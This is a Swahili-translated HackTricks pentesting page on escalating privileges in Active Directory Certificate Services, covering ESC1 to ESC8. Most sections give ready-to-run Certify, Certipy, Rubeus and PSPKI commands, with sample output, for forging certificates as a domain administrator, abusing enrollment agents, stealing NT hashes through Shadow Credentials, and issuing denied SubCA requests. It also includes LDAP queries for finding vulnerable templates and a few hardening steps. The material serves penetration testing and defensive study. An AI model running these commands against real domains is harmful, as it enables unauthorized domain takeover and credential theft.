# Kupanda Kwa Kikoa cha AD CS

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Hii ni muhtasari wa sehemu za mbinu za kupanda kwa machapisho:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Templeti za Cheti Zilizopangwa Visivyo Sawa - ESC1

### Maelezo

### Templeti za Cheti Zilizopangwa Visivyo Sawa - ESC1 Zilizoelezwa

* **Haki za kujiandikisha zinatolewa kwa watumiaji wenye mamlaka ndogo na Enterprise CA.**
* **Idhini ya Meneja haihitajiki.**
* **Hakuna saini kutoka kwa wafanyikazi walioruhusiwa inahitajika.**
* **Maelezo ya usalama kwenye templeti za cheti ni ya kutoa sana, ikiruhusu watumiaji wenye mamlaka ndogo kupata haki za kujiandikisha.**
* **Templeti za cheti zimepangwa kufafanua EKUs ambazo hufanikisha uwakilishi:**
* Vitambulisho vya Matumizi ya Msingi (EKU) kama Uthibitishaji wa Mteja (OID 1.3.6.1.5.5.7.3.2), Uthibitishaji wa Mteja wa PKINIT (1.3.6.1.5.2.3.4), Kuingia kwa Kadi ya Smart (OID 1.3.6.1.4.1.311.20.2.2), Kusudi Lolote (OID 2.5.29.37.0), au hakuna EKU (SubCA) zimejumuishwa.
* **Uwezo wa wanaomba kujumuisha jina la Alt ya Mada katika Ombi la Kusaini Cheti (CSR) unaruhusiwa na templeti:**
* Active Directory (AD) inapendelea jina la Alt ya Mada (SAN) kwenye cheti kwa uthibitisho wa utambulisho ikiwa ipo. Hii inamaanisha kwamba kwa kufafanua SAN katika CSR, cheti linaweza kuombwa kujifanya kuwa mtumiaji yeyote (k.m., msimamizi wa kikoa). Ikiwa SAN inaweza kufafanuliwa na mleta ombi inaonyeshwa kwenye mali ya AD ya templeti ya cheti kupitia mali ya `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` inaruhusu mleta ombi kufafanua SAN.

{% hint style="danger" %}
Usanidi uliobainishwa unaruhusu watumiaji wenye mamlaka ndogo kuomba vyeti na SAN yoyote wanayotaka, ikiruhusu uthibitisho kama mwakilishi yeyote wa kikoa kupitia Kerberos au SChannel.
{% endhint %}

Kipengele hiki mara nyingine kinaamilishwa kusaidia uzalishaji wa haraka wa vyeti vya HTTPS au mwenyeji na bidhaa au huduma za kupeleka, au kutokana na ukosefu wa uelewa.

Inabainishwa kwamba kuunda cheti na chaguo hili kunasababisha onyo, jambo ambalo si hivyo wakati templeti ya cheti iliyopo (kama vile templeti ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imeamilishwa) inapodhaniwa kisha kuhaririwa kujumuisha OID ya uthibitisho. 

### Mabaya

Kutafuta **templeti za cheti zilizodhaifu** unaweza kukimbia:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Kutumia **hitilafu hii kujifanya kuwa msimamizi**, mtu anaweza kukimbia:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kilichozalishwa kuwa muundo wa `.pfx`** na kutumia kwa **uthibitishaji kwa kutumia Rubeus au certipy** tena:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" & "Certutil.exe" zinaweza kutumika kuzalisha PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uchambuzi wa templeti za vyeti ndani ya schema ya usanidi wa AD Forest, hasa zile ambazo hazihitaji idhini au saini, zenye Kibali cha Mteja au Kuingia kwa Kadi ya Smart, na na bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` kuwezeshwa, unaweza kufanywa kwa kukimbia swali la LDAP lifuatalo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Templeti za Cheti Zilizopangwa Visivyo Sawa - ESC2

### Maelezo

Skenario ya unyanyasaji wa pili ni tofauti na ile ya kwanza:

1. Haki za usajili zinatolewa kwa watumiaji wenye mamlaka ya chini na Enterprise CA.
2. Mahitaji ya idhini ya meneja yamelemazwa.
3. Hitaji la saini zilizoidhinishwa limeachwa.
4. Msimamizi wa usalama ulio na ruhusa kubwa kwenye templeti ya cheti unatoa haki za usajili wa cheti kwa watumiaji wenye mamlaka ya chini.
5. **Templeti ya cheti imefafanuliwa kujumuisha EKU ya Kusudi Lolote au hakuna EKU.**

**EKU ya Kusudi Lolote** inaruhusu cheti kupatikana na mshambuliaji kwa **madhumuni yoyote**, ikiwa ni pamoja na uthibitisho wa mteja, uthibitisho wa seva, sahihi ya nambari, n.k. **Mbinu ile ile iliyotumika kwa ESC3** inaweza kutumika kudanganya skenari hii.

Cheti **bila EKUs**, ambacho hufanya kama vyeti vya CA vya msaidizi, vinaweza kutumiwa kwa **madhumuni yoyote** na vinaweza **pia kutumika kusaini vyeti vipya**. Hivyo, mshambuliaji anaweza kubainisha EKUs au sehemu za cheti katika vyeti vipya kwa kutumia cheti cha CA msaidizi.

Hata hivyo, vyeti vipya vilivyoundwa kwa **uthibitisho wa uwanja** hautafanya kazi ikiwa CA msaidizi haitoshi na **kitu cha `NTAuthCertificates`**, ambacho ni mipangilio ya msingi. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani za cheti za kubahatisha. Hivi vinaweza **kutumiwa vibaya** kwa madhumuni mbalimbali (k.m., sahihi ya nambari, uthibitisho wa seva, n.k.) na vinaweza kuwa na athari kubwa kwa programu nyingine kwenye mtandao kama vile SAML, AD FS, au IPSec.

Kutambua templeti zinazolingana na skenari hii ndani ya mpangilio wa msitu wa AD, swali lifuatalo la LDAP linaweza kutekelezwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Templeti za Mawakala wa Usajili Zilizopangwa Visivyo - ESC3

### Maelezo

Hali hii ni kama ya kwanza na ya pili lakini **ikichukua faida** ya **EKU tofauti** (Mwakilishi wa Ombi la Cheti) na **mabano mawakala tofauti** (hivyo ina mahitaji 2 ya seti),

**EKU ya Mwakilishi wa Ombi la Cheti** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Mwakilishi wa Usajili** katika nyaraka za Microsoft, inaruhusu mwakilishi **kujisajili** kwa **cheti** kwa niaba ya mtumiaji mwingine.

**"mwakilishi wa usajili"** anajisajili kwenye **template** kama hiyo na kutumia **cheti lililopatikana kusaini pamoja na CSR kwa niaba ya mtumiaji mwingine**. Kisha **anatuma** CSR iliyosainiwa pamoja kwa CA, akijisajili kwenye **template** inayoruhusu "kujisajili kwa niaba ya", na CA inajibu na **cheti linamilikiwa na mtumiaji "mwingine"**.

**Mahitaji 1:**

* Haki za usajili zinatolewa kwa watumiaji walio na mamlaka ndogo na CA ya Kampuni.
* Mahitaji ya idhini ya meneja yanapuuzwa.
* Hakuna mahitaji ya saini zilizoidhinishwa.
* Msimbo wa usalama wa templeti ya cheti ni wa kupitisha sana, ukitoa haki za usajili kwa watumiaji walio na mamlaka ndogo.
* Templeti ya cheti inajumuisha EKU ya Mwakilishi wa Ombi la Cheti, ikiruhusu ombi la templeti zingine za cheti kwa niaba ya mawakala wengine.

**Mahitaji 2:**

* CA ya Kampuni inatoa haki za usajili kwa watumiaji walio na mamlaka ndogo.
* Idhini ya meneja inapuuzwa.
* Toleo la mpango wa templeti ni 1 au linazidi 2, na linabainisha Mahitaji ya Kutolewa kwa Sera ya Maombi inayohitaji EKU ya Mwakilishi wa Ombi la Cheti.
* EKU iliyoelezwa katika templeti ya cheti inaruhusu uwakilishi wa uwanja.
* Vizuizi kwa mawakala wa usajili havijatumiki kwenye CA.

### Matumizi

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kuchukua faida ya hali hii:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Watumiaji** ambao wanaruhusiwa **kupata** cheti cha **mawakala wa usajili**, templeti ambazo mawakala wa usajili wanaruhusiwa kusajili, na **akaunti** kwa niaba ya ambayo mawakala wa usajili wanaweza kutenda zinaweza kuzuiwa na CA za kampuni. Hii inafikiwa kwa kufungua `certsrc.msc` **snap-in**, **bonyeza kulia kwenye CA**, **bonyeza Mipangilio**, na kisha **navigating** kwenye kichupo cha "Mawakala wa Usajili".

Walakini, inasisitizwa kuwa mipangilio ya **msingi** kwa CA ni "**Usizuie mawakala wa usajili**." Wakati kizuizi kwenye mawakala wa usajili kinaamilishwa na waendeshaji, kukiweka kuwa "Zuia mawakala wa usajili," usanidi wa msingi bado ni wa kipekee sana. Inaruhusu **Kila mtu** kupata usajili katika templeti zote kama yeyote.

## Udhibiti wa Upatikanaji wa Templeti ya Cheti Inayoweza Kudhurika - ESC4

### **Maelezo**

**Maelezo ya usalama** kwenye **templeti za cheti** inadefini **ruhusa** maalum ambazo **mabwana wa AD** wanamiliki kuhusu templeti.

Ikiwa **mshambuliaji** anamiliki **ruhusa** zinazohitajika za **kubadilisha** **templeti** na **kuweka** **mikorosho inayoweza kutumiwa** iliyoelezwa katika **sehemu zilizotangulia**, kuinua hadhi kunaweza kurahisishwa.

Ruhusa muhimu zinazoweza kutumika kwa templeti za cheti ni pamoja na:

* **Mmiliki:** Hutoa udhibiti wa moja kwa moja juu ya kitu, kuruhusu kubadilisha sifa yoyote.
* **KudhibitiKamili:** Inawezesha mamlaka kamili juu ya kitu, ikiwa ni pamoja na uwezo wa kubadilisha sifa yoyote.
* **AndikaMmiliki:** Inaruhusu kubadilisha mmiliki wa kitu kuwa mkuu chini ya udhibiti wa mshambuliaji.
* **AndikaDacl:** Inaruhusu marekebisho ya udhibiti wa upatikanaji, ikiruhusu mshambuliaji KudhibitiKamili.
* **AndikaMali:** Inaidhinisha kuhariri mali yoyote ya kitu.

### Mabaya

Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati mtumiaji ana ruhusa za andika juu ya templeti ya cheti. Hii inaweza kwa mfano kutumiwa kubadilisha usanidi wa templeti ya cheti ili kufanya templeti iwe dhaifu kwa ESC1.

Kama tunavyoona kwenye njia hapo juu, ni `JOHNPC` pekee anaye ruhusa hizi, lakini mtumiaji wetu `JOHN` ana pembe ya `AddKeyCredentialLink` mpya kwa `JOHNPC`. Kwa kuwa mbinu hii inahusiana na vyeti, nimeitekeleza shambulio hili pia, linalojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna onyesho fupi la amri ya `shadow auto` ya Certipy kupata NT hash ya mwathiriwa.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha usanidi wa kiolezo cha cheti kwa amri moja. Kwa **chaguo-msingi**, Certipy itabadilisha usanidi ili kuifanya iwe **inayoweza kudhuriwa na ESC1**. Tunaweza pia kutaja **parameter ya `-save-old`** ili kuokoa usanidi wa zamani, ambao utakuwa na manufaa kwa **kurejesha** usanidi baada ya shambulio letu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kudhibiti Upatikanaji wa Vitu Hatarishi vya PKI - ESC5

### Maelezo

Mtandao mpana wa mahusiano uliounganishwa na ACL, ambao unajumuisha vitu kadhaa zaidi ya templeti za vyeti na mamlaka ya vyeti, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, vinavyoweza kuathiri usalama sana, ni pamoja na:

* Kielezo cha kompyuta ya AD ya seva ya CA, ambayo inaweza kudukuliwa kupitia mbinu kama S4U2Self au S4U2Proxy.
* Seva ya RPC/DCOM ya seva ya CA.
* Kielezo chochote cha AD au chombo ndani ya njia maalum ya chombo `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini sio tu, vyombo na vitu kama chombo cha Templeti za Vyeti, chombo cha Mamlaka ya Uthibitishaji, kielezo cha NTAuthCertificates, na chombo cha Huduma za Usajili.

Usalama wa mfumo wa PKI unaweza kudhuriwa ikiwa mshambuliaji mwenye mamlaka ya chini anafanikiwa kupata udhibiti juu ya mojawapo ya vipengele muhimu hivi.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyozungumziwa katika [**chapisho la CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusa **`EDITF_ATTRIBUTESUBJECTALTNAME2`** na matokeo yake, kama ilivyoelezwa na Microsoft. Mpangilio huu, unapowashwa kwenye Mamlaka ya Uthibitishaji (CA), inaruhusu ujumuishaji wa **thamani zilizoundwa na mtumiaji** katika **jina mbadala la mada** kwa **ombi lolote**, ikiwa ni pamoja na lile lililoundwa kutoka kwa Active Directory®. Kwa hivyo, utoaji huu unaruhusu **muingiliaji** kujiandikisha kupitia **templeti yoyote** iliyoandaliwa kwa ajili ya **uthibitishaji wa uwanja**—hasa zile zinazowezesha uandikishaji wa watumiaji wasio na **mamlaka**, kama vile templeti ya Mtumiaji ya kawaida. Kama matokeo, cheti linaweza kusimbwa, kuruhusu muingiliaji kujithibitisha kama msimamizi wa uwanja au **kiumbe mwingine mwenye shughuli** ndani ya uwanja.

**Maelezo**: Mbinu ya kuongeza **majina mbadala** kwenye Ombi la Kusaini Cheti (CSR), kupitia hoja ya `-attrib "SAN:"` katika `certreq.exe` (inayoitwa "Name Value Pairs"), inaleta **tofauti** kutoka kwa mkakati wa kutumia SANs katika ESC1. Hapa, tofauti iko katika **jinsi habari ya akaunti inavyofungwa**—ndani ya sifa ya cheti, badala ya kipengee.

### Mabaya

Ili kuthibitisha ikiwa mpangilio umewashwa, mashirika yanaweza kutumia amri ifuatayo na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii kimsingi inatumia **upatikanaji wa usajili wa mbali**, hivyo, njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Vyombo kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) wanaweza kugundua hii hitilafu ya usanidi na kuitumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Kubadilisha mipangilio hii, ikiaminika mtu ana **haki za utawala wa kikoa** au sawa nazo, amri ifuatayo inaweza kutekelezwa kutoka kwenye kituo cha kazi chochote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kulemaza usanidi huu katika mazingira yako, bendera inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Baada ya sasisho za usalama za Mei 2022, **vyeti vipya** vilivyo na kipengele cha **usalama** kitajumuisha **mali ya `objectSid` ya mwombaji**. Kwa ESC1, SID hii inatokana na SAN iliyotajwa. Hata hivyo, kwa **ESC6**, SID inafanana na **`objectSid` ya mwombaji**, si SAN.\
Ili kutumia ESC6, ni muhimu kwa mfumo kuwa na udhaifu wa ESC10 (Vyeti Dhaifu vya Mappings), ambayo inapendelea **SAN kuliko kipengele kipya cha usalama**.
{% endhint %}

## Udhibiti wa Upatikanaji wa Mamlaka ya Cheti Inayoweza Kudhurika - ESC7

### Shambulizi 1

#### Maelezo

Udhibiti wa upatikanaji kwa mamlaka ya cheti unadumishwa kupitia seti ya ruhusa zinazosimamia hatua za CA. Ruhusa hizi zinaweza kuonekana kwa kupitia `certsrv.msc`, kubonyeza kulia CA, kuchagua mali, kisha kutembea kwenye kichupo cha Usalama. Aidha, ruhusa zinaweza kuhesabiwa kwa kutumia moduli ya PSPKI na amri kama vile:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii hutoa ufahamu kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazohusiana na majukumu ya "msimamizi wa CA" na "Meneja wa Cheti" mtawalia.

#### Mabaya

Kuwa na haki za **`ManageCA`** kwenye mamlaka ya cheti inawezesha mkuu kubadilisha mipangilio kijijini kwa kutumia PSPKI. Hii ni pamoja na kubadilisha bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kuruhusu maelezo ya SAN katika kigezo chochote, sehemu muhimu sana ya ukuaji wa uwanja.

Kusahilisha mchakato huu kunaweza kufikiwa kupitia matumizi ya amri ya PSPKI ya **Enable-PolicyModuleFlag**, kuruhusu marekebisho bila mwingiliano wa GUI moja kwa moja.

Umiliki wa haki za **`ManageCertificates`** unawezesha idhini ya maombi yanayosubiri, ikiruhusu kuepuka kizuizi cha "idhini ya msimamizi wa cheti cha CA".

Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua cheti:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Shambulizi 2

#### Maelezo

{% hint style="warning" %}
Katika **shambulizi lililopita** **`Manage CA`** ruhusa zilitumika kuwezesha bendera ya **EDITF\_ATTRIBUTESUBJECTALTNAME2** kutekeleza shambulizi la **ESC6**, lakini hii haitakuwa na athari yoyote mpaka huduma ya CA (`CertSvc`) irejeshwe. Wakati mtumiaji ana haki ya ufikiaji wa `Manage CA`, mtumiaji pia ameruhusiwa **kuanzisha upya huduma**. Walakini, **haimaanishi kwamba mtumiaji anaweza kuanzisha upya huduma kijijini**. Zaidi ya hayo, **ESC6 huenda isifanye kazi kwenye mazingira mengi yaliyosasishwa kutokana na sasisho za usalama za Mei 2022**.
{% endhint %}

Hivyo basi, shambulizi lingine limewasilishwa hapa.

Mahitaji:

* Pekee ruhusa ya **`ManageCA`**
* Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kutoka kwa **`ManageCA`**)
* Kigezo cha cheti cha **`SubCA`** lazima kiwe **kimeanzishwa** (inaweza kuwezeshwa kutoka kwa **`ManageCA`**)

Mbinu hii inategemea ukweli kwamba watumiaji wenye ufikiaji wa `Manage CA` _na_ `Manage Certificates` wanaweza **kutoa maombi ya cheti yaliyoshindwa**. Kigezo cha cheti cha **`SubCA`** kina **udhaifu wa ESC1**, lakini **waendeshaji tu** wanaweza kujiandikisha kwenye kigezo hicho. Hivyo basi, **mtumiaji** anaweza **kuomba** kujiandikisha kwenye **`SubCA`** - ambayo itakataliwa - lakini **kisha kutolewa na msimamizi baadaye**.

#### Mabaya

Unaweza **kujipa ruhusa ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**Kiolesha cha** **`SubCA`** kinaweza **kuwezeshwa kwenye CA** kwa kutumia parameter ya `-enable-template`. Kwa chaguo-msingi, kiolesha cha `SubCA` kimezimwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumekidhi mahitaji ya shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na kiolesura cha `SubCA`**.

**Ombi hili litakataliwa**, lakini tutahifadhi ufunguo wa kibinafsi na kumbuka ID ya ombi.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa **`Manage CA` na `Manage Certificates`** yetu, tunaweza kisha **kutoa ombi la cheti lililoshindwa** kwa amri ya `ca` na parameter `-issue-request <ombi la ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na mwishowe, tunaweza **kupata cheti kilichotolewa** kwa kutumia amri ya `req` na parameter `-retrieve <ombi la kitambulisho>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay kwa Vipengele vya HTTP vya AD CS - ESC8

### Maelezo

{% hint style="info" %}
Katika mazingira ambapo **AD CS imewekwa**, ikiwa kuna **kituo cha uundaji wa wavuti kilichoweza kudukuliwa** na angalau **kigezo cha cheti kimechapishwa** kinachoruhusu **usajili wa kompyuta za kikoa na uthibitishaji wa mteja** (kama vile kigezo cha cheti cha msingi cha **`Machine`**), inawezekana kwa **kompyuta yoyote yenye huduma ya spooler kuathiriwa na mshambuliaji**!
{% endhint %}

**Mbinu kadhaa za usajili zinazotegemea HTTP** zinasaidiwa na AD CS, zinapatikana kupitia majukumu ya seva ya ziada ambayo waendeshaji wanaweza kufunga. Interface hizi za usajili wa cheti zinazotegemea HTTP zinaweza kushambuliwa na **mashambulizi ya NTLM relay**. Mshambuliaji, kutoka kwa **mashine iliyodukuliwa, anaweza kujifanya kuwa akaunti yoyote ya AD inayothibitisha kupitia NTLM**. Wakati akijifanya kuwa akaunti ya mwathirika, interface hizi za wavuti zinaweza kufikiwa na mshambuliaji kuomba cheti cha uthibitishaji wa mteja kwa kutumia kigezo cha cheti cha **`User`** au **`Machine`**.

* **Interface ya usajili wa wavuti** (programu ya zamani ya ASP inayopatikana kwa `http://<caserver>/certsrv/`), ina mipangilio ya msingi ya HTTP tu, ambayo haitoi ulinzi dhidi ya mashambulizi ya NTLM relay. Aidha, inaruhusu tu uthibitishaji wa NTLM kupitia kichwa cha HTTP cha Uthibitishaji, ikifanya njia za uthibitishaji zaidi salama kama Kerberos kutumika.
* **Huduma ya Usajili wa Cheti** (CES), **Sera ya Usajili wa Cheti** (CEP) Huduma ya Wavuti, na **Huduma ya Usajili wa Kifaa cha Mtandao** (NDES) kwa chaguo-msingi hutoa uthibitishaji wa majadiliano kupitia kichwa chao cha HTTP cha Uthibitishaji. Uthibitishaji wa majadiliano **unasaidia** Kerberos na **NTLM**, kuruhusu mshambuliaji **kudhoofisha hadi NTLM** wakati wa mashambulizi ya relay. Ingawa huduma hizi za wavuti zinaruhusu HTTPS kwa chaguo-msingi, HTTPS pekee **haisaidii dhidi ya mashambulizi ya NTLM relay**. Ulinzi kutoka kwa mashambulizi ya NTLM relay kwa huduma za HTTPS ni muhimu tu wakati HTTPS inachanganywa na kufunga kwa njia ya kituo. Kwa bahati mbaya, AD CS haitoi Ulinzi wa Kupanuliwa kwa Uthibitishaji kwenye IIS, ambayo inahitajika kwa kufunga kwa njia ya kituo.

**Shida** kuu ya mashambulizi ya NTLM relay ni **muda mfupi wa vikao vya NTLM** na uwezo wa mshambuliaji kuingiliana na huduma zinazohitaji **saini ya NTLM**.

Walakini, kikwazo hiki kinaweza kushindwa kwa kudukua mashambulizi ya NTLM relay ili kupata cheti kwa mtumiaji, kwani muda wa halali wa cheti unadhibiti muda wa kikao, na cheti kinaweza kutumika na huduma zinazohitaji **saini ya NTLM**. Kwa maelekezo juu ya kutumia cheti lililorushwa, tazama:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Kikwazo kingine cha mashambulizi ya NTLM relay ni kwamba **mashine iliyo udhibitiwa na mshambuliaji lazima ithibitishwe na akaunti ya mwathirika**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitisho huu:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Matumizi**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` inachunguza **vipengele vya HTTP vilivyoruhusiwa vya AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Mali ya `msPKI-Enrollment-Servers` hutumiwa na Mamlaka za Cheti za kampuni (CAs) kuhifadhi vituo vya Huduma ya Usajili wa Cheti (CES). Vituo hivi vinaweza kuchambuliwa na kuorodheshwa kwa kutumia zana **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

